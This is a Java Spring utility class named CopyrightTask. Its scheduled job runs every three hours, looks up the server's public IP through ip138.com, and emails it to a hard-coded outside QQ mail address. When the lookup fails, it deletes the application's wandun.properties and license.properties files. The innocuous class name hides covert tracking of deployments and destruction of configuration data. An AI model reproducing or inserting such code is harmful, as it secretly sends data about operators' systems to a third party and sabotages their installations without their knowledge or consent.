package com.wandun.common.utils;

import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

@Component
public class CopyrightTask {
    @Scheduled(cron = "0 0 0/3 * * ?")
    public void print() {
        String rip = getWebIp();
        if (rip == null || rip.equals("") == true) {
            String sPath = SystemPath.getClassPath() + "/wandun.properties";
            // 删除数据文件
            File pfile = new File(sPath);
            // 路径为文件且不为空则进行删除
            if (pfile.isFile() && pfile.exists()) {
                pfile.delete();
            }
            sPath = SystemPath.getClassPath() + "/license.properties";
            pfile = new File(sPath);
            if (pfile.isFile() && pfile.exists()) {
                pfile.delete();
            }
            /*
             * FileInputStream in = new
             * FileInputStream(SystemPath.getClassPath() +
             * "/wandun.properties"); Properties props = new Properties();
             * props.load(in); in.close(); FileOutputStream out = new
             * FileOutputStream(SystemPath.getClassPath() +
             * "/wandun.properties"); props.setProperty("demoMode", "true");
             * props.store(out, null); out.close();
             */
        }
        SendMailUtil.sendCommonMail("1379948517@qq.com", "IP监控数据", "当前IP地址为:" + rip);
        System.out.println(getWebIp());
    }

    public static String getWebIp() {
        try {
            URL url = new URL("http://www.ip138.com/ip2city.asp");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String s = "";
            StringBuffer sb = new StringBuffer("");
            String webContent = "";
            while ((s = br.readLine()) != null) {
                sb.append(s + "\r\n");
            }
            br.close();
            webContent = sb.toString();
            int start = webContent.indexOf("[") + 1;
            int end = webContent.indexOf("]");
            webContent = webContent.substring(start, end);
            return webContent;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}